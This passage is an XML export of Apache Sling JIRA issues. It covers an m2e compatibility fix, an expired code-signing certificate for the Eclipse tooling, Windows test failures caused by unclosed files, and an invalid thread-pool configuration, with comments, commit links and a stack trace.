                            <comment id="17607217" author="kwin" created="Tue, 20 Sep 2022 13:55:39 +0000"  >&lt;p&gt;I am not sure that this change was deliberate in m2e, so I raised &lt;a href=&quot;https://github.com/eclipse-m2e/m2e-core/issues/918&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/eclipse-m2e/m2e-core/issues/918&lt;/a&gt; to clarify this backwards-incompatibility in m2e 2.x.&lt;/p&gt;</comment>
                            <comment id="17607259" author="kwin" created="Tue, 20 Sep 2022 15:13:41 +0000"  >&lt;p&gt;Unfortunately it seems they deliberately broke with almost all pre 2.x API (without any transition phase). Due to the use of records in the API, this also requires the Sling IDE Eclipse Tooling to be built with Java14+.&lt;/p&gt;</comment>
                            <comment id="17626629" author="kwin" created="Mon, 31 Oct 2022 14:51:35 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-ide-tooling/commit/c26c37581748a74627cc822e564388bccd8c26f6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-ide-tooling/commit/c26c37581748a74627cc822e564388bccd8c26f6&lt;/a&gt; which also lead to requiring now:&lt;/p&gt;

&lt;ul class=&quot;alternate&quot; type=&quot;square&quot;&gt;
	&lt;li&gt;Java 17&lt;/li&gt;
	&lt;li&gt;Eclipse 2022-09&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17769039" author="JIRAUSER302374" created="Tue, 26 Sep 2023 07:19:49 +0000"  >&lt;p&gt;Successfully tested with Eclipse 2023-09-R and latest nightly build from &lt;a href=&quot;https://nightlies.apache.org/sling/eclipse/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://nightlies.apache.org/sling/eclipse/&lt;/a&gt;; &quot;Maven -&amp;gt; Update Project&quot; works correctly now.&lt;/p&gt;</comment>
                            <comment id="17769569" author="JIRAUSER302374" created="Wed, 27 Sep 2023 12:05:06 +0000"  >&lt;p&gt;Temporary fix for 1.2.2 version, until 2.0.0 will be released:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;Sources taken from current master;&lt;/li&gt;
	&lt;li&gt;Slightly modified some java files (attached), sources recompiled;&lt;/li&gt;
	&lt;li&gt;Starting from the current 1.2.2 JAR, the attached JAR has these classes replaced from compiled ones:
	&lt;ul&gt;
		&lt;li&gt;SlingstartProjectConfigurator&lt;/li&gt;
		&lt;li&gt;The attached Java files after compiling&lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13063206/13063206_AbstractBundleProjectConfigurator.java&quot; title=&quot;AbstractBundleProjectConfigurator.java attached to SLING-11590&quot;&gt;AbstractBundleProjectConfigurator.java&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17769614" author="kwin" created="Wed, 27 Sep 2023 13:38:11 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=mainagioia&quot; class=&quot;user-hover&quot; rel=&quot;mainagioia&quot;&gt;mainagioia&lt;/a&gt; Any issues with the nightly build referenced above which makes you want to build your own custom version?&lt;/p&gt;</comment>
                            <comment id="17769618" author="JIRAUSER302374" created="Wed, 27 Sep 2023 13:47:16 +0000"  >&lt;p&gt;No, the nightly build itself works; this temporary fix is for cases when this fix is needed in Eclipse plugins which have 1.2.2 version as a dependency. For example, this problem arises in latest AEM Tools for Eclipse, which has 1.2.2 as a dependency, in which &quot;Maven - Update project&quot; no longer works.&lt;/p&gt;

&lt;p&gt;If I try to install nightly build of Sling, Eclipse installer requires uninstalling AEM Tools because of the now-invalid dependency;&#160; by taking the JAR I modified and replacing it in Eclipse plugins directory, AEM Tools and this &quot;temporary&quot; version of Sling Tools can coexist... obviously until 2.0.0 is released and AEM Tools (and others) update their dependency requirement.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13063206" name="AbstractBundleProjectConfigurator.java" size="3527" author="mainagioia" created="Wed, 27 Sep 2023 12:05:02 +0000"/>
                            <attachment id="13063207" name="ContentPackageProjectConfigurator.java" size="12076" author="mainagioia" created="Wed, 27 Sep 2023 12:05:02 +0000"/>
                            <attachment id="13063208" name="MavenProjectUtils.java" size="4626" author="mainagioia" created="Wed, 27 Sep 2023 12:05:02 +0000"/>
                            <attachment id="13063209" name="org.apache.sling.ide.eclipse-m2e-ui_1.2.2.jar" size="84002" author="mainagioia" created="Wed, 27 Sep 2023 12:05:02 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>4.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 4 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18pg8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11588] Certificate used to sign Sling IDE Tooling for Eclipse expired 02/2021</title>
                <link>https://issues.apache.org/jira/browse/SLING-11588</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The certificate which has been used to sign the release 1.2.2 from Sling IDE Tooling for Eclipse expired on 27th of February 2021. That leads to invalid certificate warnings when installing it in newer Eclipse versions.&lt;br/&gt;
You find the expired certificate used for signing attached:  &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13049499/13049499_82840479001475880637676110500335113906-1.der&quot; title=&quot;82840479001475880637676110500335113906-1.der attached to SLING-11588&quot;&gt;82840479001475880637676110500335113906-1.der&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; &lt;/p&gt;</description>
                <environment></environment>
        <key id="13482319">SLING-11588</key>
            <summary>Certificate used to sign Sling IDE Tooling for Eclipse expired 02/2021</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Tue, 20 Sep 2022 08:06:07 +0000</created>
                <updated>Fri, 30 Sep 2022 09:10:18 +0000</updated>
                                            <version>Sling Eclipse IDE 1.2.2</version>
                                                    <component>IDE</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17606975" author="kwin" created="Tue, 20 Sep 2022 08:07:33 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; Can you spin a new release with an updated signature?&lt;/p&gt;</comment>
                            <comment id="17609479" author="rombert" created="Mon, 26 Sep 2022 12:53:24 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; - unfortunately that&apos;s not possible until we switch to the new code signing service - &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10064&quot; title=&quot;Switch code signing to use the Digicert code signing service&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10064&quot;&gt;&lt;del&gt;SLING-10064&lt;/del&gt;&lt;/a&gt; .&lt;/p&gt;</comment>
                            <comment id="17611437" author="kwin" created="Fri, 30 Sep 2022 08:57:31 +0000"  >&lt;p&gt;There is now a new keypair for Sling at &lt;a href=&quot;https://one.digicert.com/signingmanager/keypairs/be8507fa-dd5c-436c-b0d8-c43708d18a49?alias=Sling-PMC-2022-09&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://one.digicert.com/signingmanager/keypairs/be8507fa-dd5c-436c-b0d8-c43708d18a49?alias=Sling-PMC-2022-09&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17611451" author="kwin" created="Fri, 30 Sep 2022 09:10:18 +0000"  >&lt;p&gt;Seems that &lt;a href=&quot;https://ebourg.github.io/jsign/#maven&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ebourg.github.io/jsign/#maven&lt;/a&gt; is the recommended Maven plugin for signing, which directly integrates with a digicert online keystore.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13049499" name="82840479001475880637676110500335113906-1.der" size="1270" author="kwin" created="Tue, 20 Sep 2022 08:09:31 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>1.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 3 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18oy8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11587] SimpleDistributionQueueProvider fails to close checkpoint file</title>
                <link>https://issues.apache.org/jira/browse/SLING-11587</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Causing test failure on Windows.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481976">SLING-11587</key>
            <summary>SimpleDistributionQueueProvider fails to close checkpoint file</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Sat, 17 Sep 2022 07:29:47 +0000</created>
                <updated>Mon, 19 Sep 2022 04:41:10 +0000</updated>
                            <resolved>Mon, 19 Sep 2022 04:41:10 +0000</resolved>
                                                    <fixVersion>Content Distribution Core 0.6.0</fixVersion>
                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17606064" author="reschke" created="Sat, 17 Sep 2022 07:44:46 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/65&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/65&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17606415" author="cziegeler" created="Mon, 19 Sep 2022 04:41:10 +0000"  >&lt;p&gt;Thanks, I&apos;ve applied the PR&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18mu8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11586] FileBackedMemoryOutputStream tests fails on Windows due to unclosed streams</title>
                <link>https://issues.apache.org/jira/browse/SLING-11586</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Likely due to unclosed streams before file delete attempt.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481975">SLING-11586</key>
            <summary>FileBackedMemoryOutputStream tests fails on Windows due to unclosed streams</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Sat, 17 Sep 2022 07:02:41 +0000</created>
                <updated>Mon, 19 Sep 2022 04:58:47 +0000</updated>
                            <resolved>Mon, 19 Sep 2022 04:58:47 +0000</resolved>
                                                    <fixVersion>Content Distribution Core 0.6.0</fixVersion>
                                    <component>Content Distribution</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17606060" author="reschke" created="Sat, 17 Sep 2022 07:28:28 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/64&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/pull/64&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17606418" author="cziegeler" created="Mon, 19 Sep 2022 04:46:40 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; I&apos;ve applied the patch, however the tests still fail for me on windows&lt;/p&gt;</comment>
                            <comment id="17606423" author="cziegeler" created="Mon, 19 Sep 2022 04:58:47 +0000"  >&lt;p&gt;Fixed the failing test by using the system tmp dir (instead of hard-coded /tmp): &lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-distribution-core/commit/62176ac72e63352458fc3a51a2f1b7222cac1f72&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-distribution-core/commit/62176ac72e63352458fc3a51a2f1b7222cac1f72&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18mu0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11585] Invalid configuration for the sling-event thread pool factory</title>
                <link>https://issues.apache.org/jira/browse/SLING-11585</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In the starter event.json, the sling-event thread pool factory has an invalid configuration that results in an IllegalArgumentException getting thrown at runtime.&#160; This causes all the scheduled jobs to not get triggered.&lt;/p&gt;

&lt;p&gt;Specifically, the maxPoolSize is smaller than the minPoolSize:&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-quote&quot;&gt;&quot;maxPoolSize:&lt;span class=&quot;code-object&quot;&gt;Integer&lt;/span&gt;&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;1&quot;&lt;/span&gt;,
&#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-quote&quot;&gt;&quot;minPoolSize:&lt;span class=&quot;code-object&quot;&gt;Integer&lt;/span&gt;&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;5&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;The illegal config causes a few exceptions with stack traces like this:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;java.lang.IllegalArgumentException
&#160; &#160; at java.base/java.util.concurrent.ThreadPoolExecutor.&amp;lt;init&amp;gt;(ThreadPoolExecutor.java:1293)
&#160; &#160; at org.apache.sling.commons.threads.impl.DefaultThreadPool.&amp;lt;init&amp;gt;(DefaultThreadPool.java:160)
&#160; &#160; at org.apache.sling.commons.threads.impl.DefaultThreadPoolManager$Entry.incUsage(DefaultThreadPoolManager.java:371)
&#160; &#160; at org.apache.sling.commons.threads.impl.DefaultThreadPoolManager.get(DefaultThreadPoolManager.java:143)
&#160; &#160; at org.apache.sling.commons.scheduler.impl.SchedulerProxy.&amp;lt;init&amp;gt;(SchedulerProxy.java:65)
&#160; &#160; at org.apache.sling.commons.scheduler.impl.QuartzScheduler.scheduleJob(QuartzScheduler.java:588)
&#160; &#160; at org.apache.sling.commons.scheduler.impl.QuartzScheduler.schedule(QuartzScheduler.java:526)
&#160; &#160; at org.apache.sling.commons.scheduler.impl.SchedulerServiceFactory.schedule(SchedulerServiceFactory.java:63)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13481941">SLING-11585</key>
            <summary>Invalid configuration for the sling-event thread pool factory</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Fri, 16 Sep 2022 22:24:03 +0000</created>
                <updated>Fri, 17 Jan 2025 09:58:34 +0000</updated>
                            <resolved>Sat, 17 Sep 2022 00:08:10 +0000</resolved>
                                                    <fixVersion>Starter 13</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17606017" author="enorman" created="Sat, 17 Sep 2022 00:08:10 +0000"  >&lt;p&gt;Merged PR at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/commit/ac9e4ce5b727d6c2833a3dd49d93ca852d8f62ea&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;ac9e4ce&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
